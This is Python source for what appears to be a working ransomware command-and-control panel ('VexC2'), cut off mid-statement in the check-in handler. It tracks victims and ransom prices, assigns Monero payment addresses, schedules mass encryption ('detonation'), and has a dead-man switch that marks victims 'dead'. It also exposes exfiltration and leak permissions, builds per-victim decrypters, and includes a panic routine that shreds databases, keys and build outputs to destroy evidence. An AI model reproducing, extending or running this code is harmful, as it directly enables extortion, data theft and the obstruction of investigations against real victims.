"""VexC2 3.0 — production operator console for the Plainfield payload.

    python app.py                 # dev server
    waitress-serve --listen=0.0.0.0:5000 app:app   # production (see run_prod.py)

Env:
  VEX_PASS              seed password for the first operator (username: admin)
  VEX_ROOT_USER         root username          (default root)
  VEX_ROOT_PASS         root password          (root is seeded only when set)
  VEX_DB                sqlite path            (default VexC2/vex_c2.db)
  VEX_PRIV              RSA private key        (default VexC2/priv.pem)
  VEX_SECRET            session signing key    (default persisted .secret)
  VEX_SECURE_COOKIE=1   mark cookies Secure (behind TLS)
  VEX_ADMIN_IPS         comma-separated allowlist for /admin
  VEX_BACKUP_DIR        startup DB snapshot dir (keeps `backup_keep` files)
  VEX_PAYMENTS=1        run the wallet-RPC payment poller
  VEX_WEBHOOK / VEX_TG_TOKEN+VEX_TG_CHAT   operator notifications
  PORT                  listen port (5000)
"""

import base64
import glob
import csv
import datetime
import hashlib
import hmac
import html as html_mod
import io
import json
import os
import re
import secrets
import shutil
import sqlite3
import sys
import threading
import time
import urllib.parse
import zipfile

from flask import (Flask, Response, abort, flash, jsonify, redirect,
                   render_template, request, send_file, session, url_for)

import c2db
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "tools"))
import campaign_build as campaign_builder
import crypto_util
import decrypter_build
import notify
import payments
import vault
import vault_rotate

APP_DIR = os.path.dirname(os.path.abspath(__file__))
TEMPLATE_FILE = os.environ.get(
    "VEX_DECRYPTER_TEMPLATE", os.path.join(APP_DIR, "decrypter_template.cpp"))
PRIV_KEY_FILE = os.path.abspath(os.environ.get(
    "VEX_PRIV", os.path.join(APP_DIR, "priv.pem")))
SECRET_FILE = os.path.abspath(os.path.join(APP_DIR, ".secret"))
UPLOAD_DIR = os.path.abspath(os.environ.get(
    "VEX_UPLOADS", os.path.join(APP_DIR, "uploads")))
try:
    os.makedirs(UPLOAD_DIR, exist_ok=True)
except OSError as _exc:
    print(f"[!] cannot create uploads dir {UPLOAD_DIR}: {_exc}")
if not c2db.IS_PG:
    c2db.DB_FILE = os.path.abspath(c2db.DB_FILE)
decrypter_build.CACHE_DIR = os.path.abspath(decrypter_build.CACHE_DIR)

app = Flask(__name__)
app.config.update(
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE="Lax",
    SESSION_COOKIE_SECURE=os.environ.get("VEX_SECURE_COOKIE") == "1",
    MAX_CONTENT_LENGTH=32 * 1024 * 1024,
)


_VID_RE = re.compile(r"^[A-Za-z0-9+/=_-]{16,64}$")
_C2_URL_RE = re.compile(r"^https?://[A-Za-z0-9.\-:\[\]]+$")


def _safe_component(value, limit: int = 80) -> str:
    """Filesystem-safe path component for a VID/transfer id."""
    return re.sub(r"[^A-Za-z0-9._-]", "_", str(value or ""))[:limit] or "x"


def _cpp_literal(value) -> str:
    """Escape a value for safe embedding in a C++ string literal.

    VID and the request host are attacker-influenced; injecting them raw into
    the decrypter template is source injection on the operator's compiler.
    """
    out = []
    for ch in str(value or ""):
        if ch in "\r\n\x00":
            continue
        if ch in "\\\"":
            out.append("\\" + ch)
        elif ord(ch) < 0x20:
            out.append("?")
        else:
            out.append(ch)
    return "".join(out)


def _safe_aes_key(value) -> str:
    """Return canonical base64 for a 32-byte AES key, or empty.

    The decrypter template is C++ source; never embed an arbitrary DB string.
    Normal keys are base64 already, but a tampered/manual row must still fail
    closed instead of breaking (or injecting into) the generated source.
    """
    try:
        raw = base64.b64decode(str(value or ""), validate=True)
    except Exception:
        return ""
    if len(raw) != 32:
        return ""
    return base64.b64encode(raw).decode()


def _c2_base() -> str:
    """Request base URL, accepted only in a strict scheme/host[:port] shape."""
    base = (request.host_url or "").rstrip("/")
    return base if _C2_URL_RE.match(base) else ""


def _secret_key() -> bytes:
    env = os.environ.get("VEX_SECRET")
    if env:
        return env.encode()
    try:
        with open(SECRET_FILE, "rb") as f:
            data = f.read().strip()
            if len(data) >= 32:
                return data
    except OSError:
        pass
    data = secrets.token_hex(32).encode()
    try:
        with open(SECRET_FILE, "wb") as f:
            f.write(data)
        os.chmod(SECRET_FILE, 0o600)
    except OSError:
        pass
    return data


app.secret_key = _secret_key()
c2db.init_db()
cipher_rsa = crypto_util.load_private_key(PRIV_KEY_FILE)
print("[+] private key loaded" if cipher_rsa else "[!] priv.pem missing: unwrap disabled")

LOGIN_WINDOW = 60
LOGIN_MAX = 8
_login_attempts = {}
_last_attempt_cleanup = [0.0]


# ---------------------------------------------------------------------------
# csrf / auth / globals
# ---------------------------------------------------------------------------
def csrf_token() -> str:
    tok = session.get("csrf")
    if not tok:
        tok = secrets.token_hex(16)
        session["csrf"] = tok
    return tok


@app.context_processor
def inject_globals():
    return {
        "csrf_token": csrf_token(),
        "current_user": current_user(),
        "current_role": current_role(),
        "is_root": current_role() in ("root", "shadow"),
        "impersonating": session.get("impersonate"),
        "lockdown": (c2db.get_setting("lockdown", "0") or "0") == "1",
        "exe_build_available": decrypter_build.available(),
        "notify_enabled": notify.enabled(),
        "payments_rpc": payments.configured(),
    }


@app.before_request
def csrf_guard():
    if request.method in ("POST", "PUT", "DELETE") and not request.path.startswith("/api/"):
        sent = request.form.get("csrf") or request.headers.get("X-CSRF", "")
        if not sent or not secrets.compare_digest(sent, session.get("csrf", "")):
            abort(400)
    return None



def with_root_operator() -> bool:
    with c2db.db() as conn:
        return conn.execute("SELECT 1 FROM operators WHERE role='root' LIMIT 1"
                            ).fetchone() is not None

def _filter_root_events(events):
    if current_role() in ("root", "shadow"):
        return events
    with c2db.db() as conn:
        roots = {r[0] for r in conn.execute(
            "SELECT username FROM operators WHERE role IN ('root','shadow')")}
    out = []
    for e in events:
        if (e["actor"] in roots or e["actor"] in ("root", "shadow")
                or (e["kind"] or "").startswith("root_")):
            continue
        item = dict(e)
        for name in roots:
            if not name:
                continue
            item["detail"] = (item["detail"] or "").replace(name, "operator")
            if item["actor"] == name:
                item["actor"] = "operator"
        out.append(item)
    return out


def _safe_next(raw: str, fallback: str) -> str:
    raw = (raw or "").strip()
    if not raw.startswith("/") or raw.startswith("//") or "\\" in raw:
        return fallback
    return raw


def _client_ip() -> str:
    if os.environ.get("VEX_TRUST_PROXY") == "1":
        fwd = (request.headers.get("X-Forwarded-For") or "").split(",")[0].strip()
        if fwd:
            return fwd
    return request.remote_addr or "?"


def current_user():
    return session.get("impersonate") or session.get("user")


def current_role():
    if session.get("impersonate"):
        return session.get("impersonate_role", "admin")
    return session.get("role", "viewer")



PERMISSIONS = {
    "viewer": {"view"},
    "negotiator": {"view", "chat"},
    "affiliate": {"affiliate"},
    "admin": {"view", "chat", "operate", "finance", "campaigns",
              "settings", "operators", "leak", "exfil", "export"},
    "root": {"*"},
    "shadow": {"*"},
}


def can(perm: str) -> bool:
    role = current_role()
    if role in ("root", "shadow"):
        return True
    return perm in PERMISSIONS.get(role, set())


def require_perm(perm: str):
    def deco(fn):
        def wrapper(*a, **kw):
            if not session.get("user"):
                return redirect(url_for("login", next=request.path))
            if not can(perm):
                abort(403)
            return fn(*a, **kw)
        wrapper.__name__ = fn.__name__
        return wrapper
    return deco

def has_role(allowed) -> bool:
    role = current_role()
    if role in ("root", "shadow"):
        return True
    allowed = allowed if isinstance(allowed, (tuple, list, set)) else (allowed,)
    return role in allowed


def login_required(role=None):
    def deco(fn):
        def wrapper(*a, **kw):
            if not session.get("user"):
                return redirect(url_for("login", next=request.path))
            if role is not None and not has_role(role):
                abort(403)
            return fn(*a, **kw)
        wrapper.__name__ = fn.__name__
        return wrapper
    return deco


def root_required(fn):
    def wrapper(*a, **kw):
        if not session.get("user"):
            return redirect(url_for("login", next=request.path))
        if current_role() not in ("root", "shadow"):
            abort(403)
        return fn(*a, **kw)
    wrapper.__name__ = fn.__name__
    return wrapper


_ROOT_PENDING = {}
_ROOT_PENDING_LOCK = threading.Lock()
_ROOT_PENDING_TTL = 600


def _stash_root_pending(path: str, form) -> str:
    token = secrets.token_hex(16)
    now = time.time()
    with _ROOT_PENDING_LOCK:
        for k, item in list(_ROOT_PENDING.items()):
            if item[0] <= now:
                _ROOT_PENDING.pop(k, None)
        _ROOT_PENDING[token] = (now + _ROOT_PENDING_TTL, path, dict(form))
    return token


def _take_root_pending(token: str):
    if not token:
        return None
    with _ROOT_PENDING_LOCK:
        item = _ROOT_PENDING.pop(token, None)
    if not item or item[0] <= time.time():
        return None
    return {"path": item[1], "form": item[2]}


def root_stepup_ok() -> bool:
    try:
        if time.time() - float(session.get("root_stepup_at", 0) or 0) > 300:
            return False
    except (TypeError, ValueError):
        return False
    if session.get("root_stepup_ip") != _client_ip():
        return False
    if session.get("root_stepup_ua") != _ua_hash():
        return False
    return True


def root_stepup_required(fn):
    """Root/shadow plus a fresh TOTP/password step-up within the last 5 minutes."""
    def wrapper(*a, **kw):
        if not session.get("user"):
            return redirect(url_for("login", next=request.path))
        if current_role() not in ("root", "shadow"):
            abort(403)
        if not root_stepup_ok():
            if request.method == "POST":
                # The action itself is POST-only; remember it server-side so
                # secrets never enter the signed (readable) session cookie.
                session["root_pending_token"] = _stash_root_pending(
                    request.path,
                    {k: v for k, v in request.form.items() if k != "csrf"})
            return redirect(url_for("root_stepup", next=request.path))
        return fn(*a, **kw)
    wrapper.__name__ = fn.__name__
    return wrapper


def _root_operator():
    with c2db.db() as conn:
        return conn.execute("SELECT * FROM operators WHERE role='root' "
                            "ORDER BY id LIMIT 1").fetchone()


def _stepup_operator():
    with c2db.db() as conn:
        op = conn.execute("SELECT * FROM operators WHERE username=?",
                          (session.get("user"),)).fetchone()
        if op and op["role"] in ("root", "shadow"):
            return op
    return None


def _flag(key: str) -> bool:
    try:
        return (c2db.get_setting(key, "0") or "0") == "1"
    except Exception:
        return False


def _audit_blocked() -> bool:
    """Audit freeze hides forensic views from everyone below root/shadow."""
    return _flag("audit_frozen") and current_role() not in ("root", "shadow")


def _ua_hash() -> str:
    ua = request.headers.get("User-Agent") or ""
    return hashlib.sha256(ua.encode("utf-8", "replace")).hexdigest()[:16]


def _parse_when(raw: str):
    raw = (raw or "").strip()
    for fmt in ("%Y-%m-%dT%H:%M", "%Y-%m-%d %H:%M:%S", "%Y-%m-%d %H:%M"):
        try:
            return datetime.datetime.strptime(raw, fmt)
        except ValueError:
            continue
    return None


def _stamp_root_seen() -> None:
    c2db.set_setting("root_last_seen", c2db.now())


def _schedule_tick() -> None:
    at = (c2db.get_setting("detonate_at", "") or "").strip()
    if not at:
        return
    try:
        due = datetime.datetime.strptime(at, "%Y-%m-%d %H:%M:%S")
    except ValueError:
        c2db.set_setting("detonate_at", "")
        return
    if due > datetime.datetime.now():
        return
    with c2db.db() as conn:
        n = conn.execute("""UPDATE victims SET detonate=1, status='encrypted'
                            WHERE detonate=0 AND pardon=0
                              AND status NOT IN ('dead','pardoned','paid')""").rowcount
        conn.commit()
    c2db.set_setting("detonate_at", "")
    c2db.log_event("root", "scheduled_arm", "", f"{n} victims")
    notify.send(f"ROOT scheduled detonation fired: {n} victims")


def _deadman_tick() -> None:
    try:
        hours = int(c2db.get_setting("deadman_hours", "0") or 0)
    except ValueError:
        hours = 0
    if hours <= 0 or _flag("deadman_fired"):
        return
    last = (c2db.get_setting("root_last_seen", "") or "").strip()
    if not last:
        _stamp_root_seen()
        return
    try:
        seen = datetime.datetime.strptime(last, "%Y-%m-%d %H:%M:%S")
    except ValueError:
        return
    if datetime.datetime.now() - seen < datetime.timedelta(hours=hours):
        return
    action = c2db.get_setting("deadman_action", "none") or "none"
    if action == "pardon":
        with c2db.db() as conn:
            n = conn.execute("""UPDATE victims SET pardon=1, detonate=0,
                                status='pardoning'
                                WHERE status NOT IN ('dead','pardoned','paid')""").rowcount
            conn.execute("UPDATE commands SET status='canceled', updated=? "
                         "WHERE status IN ('pending','dispatched') "
                         "AND ctype IN ('lock','wipe') AND vid IN "
                         "(SELECT vid FROM victims WHERE pardon=1)", (c2db.now(),))
            conn.commit()
    elif action == "kill":
        with c2db.db() as conn:
            n = conn.execute("""UPDATE victims SET detonate=2, pardon=0,
                                status='dead'
                                WHERE status NOT IN ('dead','pardoned','paid')""").rowcount
            conn.commit()
    else:
        c2db.set_setting("deadman_fired", "1")
        return
    c2db.set_setting("deadman_fired", "1")
    c2db.log_event("root", "deadman_fired", "", f"{action} {n} victims")
    notify.send(f"ROOT deadman fired: {action} on {n} victims")


def _housekeeping_tick() -> None:
    with _HOUSEKEEPING_LOCK:
        _schedule_tick()
        _deadman_tick()


def _housekeeping_loop() -> None:
    while True:
        try:
            _housekeeping_tick()
        except Exception:
            pass
        time.sleep(5)


if os.environ.get("VEX_NO_HOUSEKEEPING") != "1":
    threading.Thread(target=_housekeeping_loop, daemon=True).start()


# ---------------------------------------------------------------------------
# definitive panic: five numeric pins + root step-up, burn the operation
# ---------------------------------------------------------------------------
PANIC_PIN_COUNT = 5
_BURNED_AT = 0.0


def _panic_hashes():
    try:
        raw = json.loads(c2db.get_setting("panic_pins", "") or "[]")
        return raw if isinstance(raw, list) else []
    except ValueError:
        return []


def _panic_locked() -> bool:
    raw = (c2db.get_setting("panic_lock_until", "") or "").strip()
    if not raw:
        return False
    try:
        return datetime.datetime.strptime(raw, "%Y-%m-%d %H:%M:%S") > datetime.datetime.now()
    except ValueError:
        return False


def _panic_note_failure() -> None:
    try:
        count = int(c2db.get_setting("panic_fail_count", "0") or 0) + 1
    except ValueError:
        count = 1
    if count >= 5:
        until = (datetime.datetime.now() +
                 datetime.timedelta(minutes=10)).strftime("%Y-%m-%d %H:%M:%S")
        c2db.set_setting("panic_lock_until", until)
        c2db.set_setting("panic_fail_count", "0")
    else:
        c2db.set_setting("panic_fail_count", str(count))


def _panic_verify(pins):
    """Return (ok, message). Five pins, in order, constant-time per hash."""
    stored = _panic_hashes()
    if len(stored) != PANIC_PIN_COUNT:
        return False, "panic pins are not configured"
    if _panic_locked():
        return False, "panic is locked after too many failures; wait 10 minutes"
    ok = True
    for pin, h in zip(pins, stored):
        if not c2db.verify_password(str(pin or ""), h):
            ok = False
    if not ok:
        _panic_note_failure()
        return False, "one or more pins are wrong"
    c2db.set_setting("panic_fail_count", "0")
    c2db.set_setting("panic_lock_until", "")
    return True, ""


def _burn_targets():
    root = os.path.dirname(APP_DIR)
    targets = []
    db_file = os.path.abspath(c2db.DB_FILE)
    if not c2db.IS_PG:
        targets += [db_file, db_file + "-wal", db_file + "-shm"]
    targets += [UPLOAD_DIR, decrypter_build.CACHE_DIR, PRIV_KEY_FILE]
    backup_dir = os.environ.get("VEX_BACKUP_DIR", "").strip()
    if backup_dir:
        targets.append(os.path.abspath(backup_dir))
    targets += glob.glob(db_file + ".pre-rotate-*")
    if not os.environ.get("VEX_SECRET"):
        targets.append(SECRET_FILE)
    if not os.environ.get("VEX_MASTER"):
        targets.append(os.path.join(APP_DIR, ".master"))
    if os.environ.get("VEX_PANIC_BUILDS", "1") != "0":
        targets += [os.path.join(root, "dist"),
                    os.path.join(root, "x64", "Release"),
                    os.path.join(root, "loader", "x64", "Release"),
                    os.path.join(root, "loader", "stage_key.h")]
    out = []
    seen = set()
    for p in targets:
        if not p:
            continue
        resolved = os.path.abspath(p)
        if resolved in seen:
            continue
        seen.add(resolved)
        if os.path.lexists(resolved):
            out.append(resolved)
    return out


def _shred_file(path: str) -> bool:
    if os.path.islink(path):
        try:
            os.unlink(path)
            return True
        except OSError:
            return False
    try:
        size = os.path.getsize(path)
        if size:
            with open(path, "r+b") as fh:
                fh.write(os.urandom(min(size, 1024 * 1024)))
                fh.flush()
                os.fsync(fh.fileno())
    except OSError:
        pass
    for _ in range(10):
        try:
            os.unlink(path)
            return True
        except FileNotFoundError:
            return True
        except OSError:
            time.sleep(0.2)
    return False


def _burn_execute(dry: bool = False) -> dict:
    global _BURNED_AT
    paths = _burn_targets()
    if dry:
        return {"dry": True, "paths": paths}
    killed = 0
    conn = None
    try:
        conn = c2db.db()
        killed = conn.execute(
            "UPDATE victims SET detonate=2, pardon=0, status='dead'"
        ).rowcount
        conn.commit()
    except Exception:
        pass
    finally:
        if conn is not None:
            try:
                conn.close()
            except Exception:
                pass
    if c2db.IS_PG:
        conn = None
        try:
            conn = c2db.db()
            conn.execute("DROP SCHEMA public CASCADE")
            conn.execute("CREATE SCHEMA public")
            conn.commit()
        except Exception:
            pass
        finally:
            if conn is not None:
                try:
                    conn.close()
                except Exception:
                    pass
    removed = []
    failed = []
    # Let any short-lived sqlite handles from this request drop first.
    import gc
    gc.collect()
    time.sleep(0.2)
    for p in paths:
        if os.path.islink(p):
            try:
                os.unlink(p)
                removed.append(p)
            except OSError:
                failed.append(p)
        elif os.path.isdir(p):
            shutil.rmtree(p, ignore_errors=True)
            if os.path.exists(p):
                failed.append(p)
            else:
                removed.append(p)
        else:
            (removed if _shred_file(p) else failed).append(p)
    _BURNED_AT = time.time()
    return {"dry": False, "killed": killed, "removed": removed,
            "failed": failed}


_CHECKIN_HITS = {}
_CHECKIN_LOCK = threading.Lock()
_SIG_SEEN = {}
_SIG_LOCK = threading.Lock()
_PROOF_LOCK = threading.Lock()
_HOUSEKEEPING_LOCK = threading.Lock()


def _configured_api_token() -> str:
    return (os.environ.get("VEX_API_TOKEN") or
            c2db.get_setting("api_token", "")).strip()


def _sig_replay(key: str) -> bool:
    """True when this exact signed request was already accepted."""
    now = time.time()
    with _SIG_LOCK:
        for k, exp in list(_SIG_SEEN.items()):
            if exp <= now:
                _SIG_SEEN.pop(k, None)
        if key in _SIG_SEEN:
            return True
        _SIG_SEEN[key] = now + 300
        if len(_SIG_SEEN) > 20000:
            _SIG_SEEN.clear()
            _SIG_SEEN[key] = now + 300
        return False


def _checkin_limited(ip: str) -> bool:
    try:
        limit = int(c2db.get_setting("checkin_rate_per_min", "120") or 120)
    except ValueError:
        limit = 120
    limit = max(5, min(limit, 10000))
    now_ts = time.time()
    with _CHECKIN_LOCK:
        hits = [t for t in _CHECKIN_HITS.get(ip, []) if now_ts - t < 60]
        hits.append(now_ts)
        _CHECKIN_HITS[ip] = hits
        if len(_CHECKIN_HITS) > 5000:
            _CHECKIN_HITS.clear()
        return len(hits) > limit


@app.before_request
def session_hygiene():
    if _BURNED_AT:
        return None
    if request.path.startswith("/static/"):
        return None
    if session.get("user") and not session.get("impersonate"):
        conn = None
        try:
            conn = c2db.db()
            op = conn.execute("SELECT username, role FROM operators "
                              "WHERE username=?", (session["user"],)).fetchone()
        except Exception:
            op = None
        finally:
            if conn is not None:
                try:
                    conn.close()
                except Exception:
                    pass
        if op is None:
            who = session.get("user")
            session.clear()
            c2db.log_event(who or "?", "session_revoked", "", _client_ip())
            flash("your operator account was removed; sign in again", "error")
            return redirect(url_for("login", next=request.path))
        if op["role"] != session.get("role"):
            session["role"] = op["role"]
        if session.get("must_enroll_2fa") and request.path not in (
                "/admin/2fa", "/admin/logout") and \
                not request.path.startswith("/static/"):
            return redirect(url_for("twofa"))
    if session.get("user"):
        try:
            idle = int(c2db.get_setting("session_idle_min", "60") or 60)
        except ValueError:
            idle = 60
        idle = max(5, min(idle, 720))
        last = session.get("last_seen") or 0
        if last and time.time() - last > idle * 60:
            user = session.get("user")
            session.clear()
            c2db.log_event(user or "?", "session_timeout", "", _client_ip())
            flash("session expired, sign in again", "error")
            return redirect(url_for("login", next=request.path))
        session["last_seen"] = time.time()
        if current_role() == "affiliate" and request.path.startswith("/admin") \
                and request.path not in ("/admin/logout",
                                         "/admin/root/view-as/stop"):
            return redirect(url_for("affiliate_home"))
    return None


@app.before_request
def api_token_guard():
    if _BURNED_AT:
        return None
    if not request.path.startswith("/api/"):
        return None
    token = _configured_api_token()
    if not token:
        return None
    sent = request.headers.get("X-Vex-Token", "")
    if secrets.compare_digest(sent, token):
        return None
    if c2db.campaign_by_token(sent):
        return None
    abort(403)


@app.before_request
def api_signature_guard():
    """Signed protocol for command-bearing endpoints (ping, report, exfil, pardon)."""
    if _BURNED_AT:
        return None
    if not (request.path == "/api/ping" or
            request.path == "/api/report" or
            request.path == "/api/pardon_exe" or
            request.path.startswith("/api/exfil")):
        return None
    # Read the raw body before any form parsing: parsing consumes the stream
    # and would make the signed material differ from what the payload signed.
    raw = request.get_data(cache=True)
    vid = (request.args.get("vid") or "").strip()
    if not vid and raw:
        try:
            from urllib.parse import parse_qs
            vid = (parse_qs(raw.decode("utf-8", "replace")).get("vid") or [""])[0].strip()
        except Exception:
            vid = ""
    if not vid:
        abort(400)
    v = c2db.get_victim(vid)
    if not v or not v["secret"]:
        # Never fail open for a legacy/unknown VID: these endpoints write files
        # or release a decrypter. Registration is the only unsigned path.
        abort(403)
    secret_b64 = vault.reveal(v["secret"])
    ts = request.headers.get("X-Vex-Ts", "")
    sig = request.headers.get("X-Vex-Sig", "")
    if not secret_b64 or not ts.isdigit() or not sig:
        if os.environ.get("VEX_DEBUG_SIG") == "1":
            print(f"[sig] missing secret/ts/sig vid={vid} secret={bool(secret_b64)} ts={ts!r}")
        abort(403)
    t = int(ts)
    if abs(int(time.time()) - t) > 300 or t < int(v["last_sig_ts"] or 0):
        if os.environ.get("VEX_DEBUG_SIG") == "1":
            print(f"[sig] clock/replay vid={vid} t={t} last={v['last_sig_ts']}")
        abort(403)
    raw = request.get_data(cache=True)
    material = f"{t}|{request.path}|".encode() + raw
    mac = hmac.new(base64.b64decode(secret_b64), material, hashlib.sha256).hexdigest()
    if not hmac.compare_digest(mac, sig):
        if os.environ.get("VEX_DEBUG_SIG") == "1":
            print(f"[sig] mismatch vid={vid} path={request.path} raw={len(raw)}B")
            print(f"[sig] want={mac[:16]} got={sig[:16]}")
        abort(403)
    replay_key = "|".join((vid, request.path, ts, sig, request.host))
    # Pings are idempotent polls and can legitimately repeat within a second
    # (payload retry / test harness). Command claiming is atomic; replay
    # protection remains on report/exfil/pardon.
    if request.path != "/api/ping" and _sig_replay(replay_key):
        if os.environ.get("VEX_DEBUG_SIG") == "1":
            print(f"[sig] replay vid={vid} path={request.path} ts={ts}")
        abort(403)
    c2db.touch_sig(vid, t)
    return None


@app.before_request
def admin_allowlist():
    allow = os.environ.get("VEX_ADMIN_IPS", "").strip()
    if not allow or not request.path.startswith("/admin"):
        return None
    if _client_ip() not in [x.strip() for x in allow.split(",") if x.strip()]:
        abort(403)
    return None


@app.before_request
def impersonation_guard():
    if session.get("impersonate") and request.method in ("POST", "PUT", "DELETE"):
        if request.path != "/admin/root/view-as/stop":
            abort(403)
    return None


@app.before_request
def lockdown_guard():
    if _BURNED_AT:
        return None
    if not _flag("lockdown"):
        return None
    if request.method not in ("POST", "PUT", "DELETE"):
        return None
    if not request.path.startswith("/admin") or not session.get("user"):
        return None
    if request.path == "/admin/root/view-as/stop":
        return None
    if current_role() in ("root", "shadow"):
        return None
    abort(403)


@app.before_request
def root_activity():
    if session.get("role") not in ("root", "shadow"):
        return None
    if not request.path.startswith("/admin"):
        return None
    now = time.time()
    if now - float(session.get("root_seen_at", 0) or 0) > 60:
        session["root_seen_at"] = now
        try:
            _stamp_root_seen()
        except Exception:
            pass
    return None


def _throttled(ip: str) -> bool:
    now = time.time()
    cnt, until = _login_attempts.get(ip, (0, 0.0))
    if now > until:
        cnt, until = 0, 0.0
    if cnt >= LOGIN_MAX:
        _login_attempts[ip] = (cnt, now + LOGIN_WINDOW)
        return True
    return False


def _note_failure(ip: str) -> None:
    now = time.time()
    cnt, until = _login_attempts.get(ip, (0, 0.0))
    if now > until:
        cnt, until = 0, 0.0
    _login_attempts[ip] = (cnt + 1, until or now + LOGIN_WINDOW)
    if now - _last_attempt_cleanup[0] > 300:
        _last_attempt_cleanup[0] = now
        for k, (c, u) in list(_login_attempts.items()):
            if now > u + 600:
                _login_attempts.pop(k, None)


# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------
def victim_or_404(vid):
    v = c2db.get_victim(vid)
    if v is None:
        abort(404)
    return v


def parse_chat(v):
    return c2db.messages_for(v["vid"])


def _save_chat_file(f, vid):
    if not f or not getattr(f, "filename", ""):
        return ""
    base = re.sub(r"[^A-Za-z0-9._-]", "_", os.path.basename(f.filename))[:80] or "file"
    name = f"chat_{_safe_component(vid)}_{secrets.token_hex(4)}_{base}"
    os.makedirs(UPLOAD_DIR, exist_ok=True)
    f.save(os.path.join(UPLOAD_DIR, name))
    return name


def online(v) -> bool:
    return c2db.online(v)


def stats_dict():
    with c2db.db() as conn:
        s = conn.execute("""
            SELECT COUNT(*),
                   SUM(CASE WHEN status='encrypted'   THEN 1 ELSE 0 END),
                   SUM(CASE WHEN status='negotiating' THEN 1 ELSE 0 END),
                   SUM(CASE WHEN status='paid'        THEN 1 ELSE 0 END),
                   SUM(CASE WHEN detonate=1           THEN 1 ELSE 0 END),
                   SUM(CASE WHEN detonate=2           THEN 1 ELSE 0 END),
                   SUM(CASE WHEN last_ping >= ?       THEN 1 ELSE 0 END),
                   SUM(CASE WHEN status='paid' THEN COALESCE(price,0) ELSE 0 END)
            FROM victims""", (c2db.day_ago(),)).fetchone()
        reports = conn.execute("SELECT COUNT(*) FROM reports").fetchone()[0]
    return {
        "total": s[0] or 0, "encrypted": s[1] or 0, "negotiating": s[2] or 0,
        "paid": s[3] or 0, "armed": s[4] or 0, "killed": s[5] or 0,
        "recent": s[6] or 0, "revenue": s[7] or 0, "reports": reports or 0,
    }


def _serve_cpp(v):
    aes_key = _safe_aes_key(vault.reveal(v["aes_key"]))
    if not aes_key:
        abort(500, description="stored AES key is not canonical base64")
    if not os.path.exists(TEMPLATE_FILE):
        abort(500)
    c2_base = _c2_base()
    with open(TEMPLATE_FILE, "r", encoding="utf-8") as f:
        src = (f.read()
               .replace("{{AES_KEY_B64}}", _cpp_literal(aes_key))
               .replace("{{VID}}", _cpp_literal(v["vid"]))
               .replace("{{C2_URL}}", _cpp_literal(c2_base)))
    safe = "".join(c for c in (v["hostname"] or "victim")
                   if c.isalnum() or c in "-_") or "victim"
    with c2db.db() as conn:
        conn.execute("UPDATE victims SET decrypter_built=1 WHERE vid=?", (v["vid"],))
        conn.commit()
    c2db.log_event(current_user() or "portal", "decrypter_cpp", v["vid"], safe)
    return Response(src, mimetype="text/plain",
                    headers={"Content-Disposition":
                             f"attachment;filename=vex_decrypter_{safe}.cpp"})


def _serve_exe(v, arch="x64"):
    aes_key = _safe_aes_key(vault.reveal(v["aes_key"]))
    if not aes_key:
        abort(500, description="stored AES key is not canonical base64")
    arch = "x86" if arch == "x86" else "x64"
    c2_base = _c2_base()
    path = decrypter_build.build(TEMPLATE_FILE, aes_key, v["vid"], c2_base, arch)
    if not path:
        return Response("decrypter build toolchain unavailable on this host\n",
                        status=503, mimetype="text/plain")
    with c2db.db() as conn:
        conn.execute("UPDATE victims SET decrypter_built=1 WHERE vid=?", (v["vid"],))
        conn.commit()
    safe = "".join(c for c in (v["hostname"] or "victim")
                   if c.isalnum() or c in "-_") or "victim"
    c2db.log_event(current_user() or "portal", "decrypter_exe", v["vid"],
                   f"{safe} {arch}")
    return send_file(path, as_attachment=True,
                     download_name=f"vex_decrypter_{safe}_{arch}.exe",
                     mimetype="application/vnd.microsoft.portable-executable")


# ---------------------------------------------------------------------------
# payload API
# ---------------------------------------------------------------------------
@app.route("/api/checkin", methods=["POST"])
def api_checkin():
    raw_body = request.get_data(cache=True)
    if _checkin_limited(_client_ip()):
        return "rate limited", 429
    vid = (request.form.get("vid") or "").strip()
    wrapped = (request.form.get("key") or request.form.get("wrapped") or "").strip()
    if not vid or not wrapped:
        return "Missing data", 400
    if not _VID_RE.match(vid):
        return "Bad vid", 400

    host = (request.form.get("host") or "").strip()
    user = (request.form.get("user") or "").strip()[:128]
    os_info = (request.form.get("os") or "Unknown").strip()[:128]
    campaign_id = c2db.campaign_by_token(
        (request.headers.get("X-Vex-Token") or "").strip())
    ip = _client_ip()
    aes = crypto_util.unwrap_key(cipher_rsa, wrapped)
    wrapped_store = vault.seal(wrapped)
    aes_store = vault.seal(aes)
    now = c2db.now()

    existing = c2db.get_victim(vid)
    if existing and existing["secret"]:
        # A re-registration must prove possession of the registration secret;
        # otherwise anyone who learns a VID can rewrite metadata or keep a
        # victim alive. Initial registration is the only unsigned path.
        sec = vault.reveal(existing["secret"])
        ts = (request.headers.get("X-Vex-Ts") or "").strip()
        sig = (request.headers.get("X-Vex-Sig") or "").strip()
        if not sec or not ts.isdigit() or not sig:
            return "registration signature required", 403
        t = int(ts)
        if abs(int(time.time()) - t) > 300 or t < int(existing["last_sig_ts"] or 0):
            return "stale registration signature", 403
        material = f"{t}|/api/checkin|".encode() + raw_body
        mac = hmac.new(base64.b64decode(sec), material, hashlib.sha256).hexdigest()
        if not hmac.compare_digest(mac, sig):
            return "bad registration signature", 403
        c2db.touch_sig(vid, t)
    price = float(c2db.get_setting("price_usd", "5000") or 0)
    xmr_default = c2db.get_setting("xmr_address", "")
    pool = [a.strip() for a in
            (c2db.get_setting("xmr_addresses", "") or "").splitlines() if a.strip()]
    deadline = c2db.deadline_for({"timestamp": now, "deadline": ""})

    with c2db.db() as conn:
        xmr = xmr_default
        if pool:
            # Assign an address no other active victim is using; fall back to
            # deterministic reuse only when the pool is exhausted.
            used = {row[0] for row in conn.execute(
                "SELECT DISTINCT xmr_address FROM victims WHERE vid!=? "
                "AND xmr_address!='' AND status NOT IN ('dead','pardoned')",
                (vid,)).fetchall()}
            start = int(hashlib.sha256(vid.encode()).hexdigest(), 16) % len(pool)
            chosen = None
            for i in range(len(pool)):
                cand = pool[(start + i) % len(pool)]
                if cand not in used:
                    chosen = cand
                    break
            xmr = chosen if chosen else pool[start]
        conn.execute("""INSERT INTO victims
            (vid, wrapped_key, aes_key, hostname, username, ip, os_info,
             timestamp, last_ping, price, xmr_address, deadline, campaign_id)
            VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)
            ON CONFLICT(vid) DO UPDATE SET
